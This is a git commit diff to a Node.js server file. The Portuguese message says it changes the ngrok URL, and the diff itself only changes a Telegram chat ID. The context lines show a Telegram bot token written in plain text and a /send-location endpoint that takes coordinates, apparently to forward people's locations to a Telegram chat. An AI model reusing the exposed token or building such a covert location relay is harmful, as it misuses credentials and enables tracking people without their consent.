6602f6d73ee4115e8b880275ae47141ab803f3e5
codin <douglasd3v.contato@gmail.com>
2025-04-16 17:14:22 -0300

    Alt na URL ngrok

--- server.js
+++ server.js
@@ -9,7 +9,7 @@ app.use(cors());
 app.use(bodyParser.json());
 
 const TELEGRAM_BOT_TOKEN = "7732312223:AAEdc077sNOUzSPogHZVhX42CbnGsY948cw";
-const TELEGRAM_CHAT_ID = "-4662059876";
+const TELEGRAM_CHAT_ID = "5391421786";
 
 app.post("/send-location", async (req, res) => {
   const { latitude, longitude, maps } = req.body;
